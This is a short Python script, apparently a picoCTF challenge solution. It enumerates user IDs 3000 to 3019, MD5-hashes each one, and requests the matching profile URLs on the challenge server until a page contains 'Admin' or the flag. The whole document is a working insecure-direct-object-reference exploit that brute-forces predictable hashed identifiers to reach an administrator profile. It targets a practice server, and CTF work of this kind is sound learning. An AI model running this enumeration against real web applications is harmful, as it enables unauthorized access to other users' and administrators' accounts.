
# run from windows machine or run it inside virtual environment

import hashlib
import requests

base_url = "http://crystal-peak.picoctf.net:62004/profile/user/"

for i in range(3000, 3020):   # adjust range if needed
    uid = str(i)
    
    # generate md5 hash
    hash_id = hashlib.md5(uid.encode()).hexdigest()
    
    url = base_url + hash_id
    r = requests.get(url)

    print(f"Checking ID {uid} -> {hash_id}")

    if "Admin" in r.text or "picoCTF" in r.text:
        print("\nFOUND POSSIBLE ADMIN!")
        print("User ID:", uid)
        print("URL:", url)
        print(r.text)
        break
